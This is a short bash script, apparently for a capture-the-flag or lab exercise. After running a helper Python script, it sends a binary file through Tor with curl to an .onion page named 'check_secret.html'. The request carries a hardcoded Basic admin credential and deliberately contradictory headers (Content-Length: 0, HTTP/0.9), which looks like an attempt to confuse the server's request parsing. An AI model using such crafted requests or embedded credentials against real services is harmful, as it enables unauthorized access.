#!/bin/bash
python3 six-target.py

cat myfile.bin | curl --trace - \
	-X POST \
	--socks5-hostname localhost:9050 \
	--data-binary  @- \
	-H 'Connection: keep-alive' \
	-H 'Content-Length: 0' \
	-H 'Authorization: Basic YWRtaW46aGFtbWVydGltZQ==' \
	--http0.9 \
	xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion/check_secret.html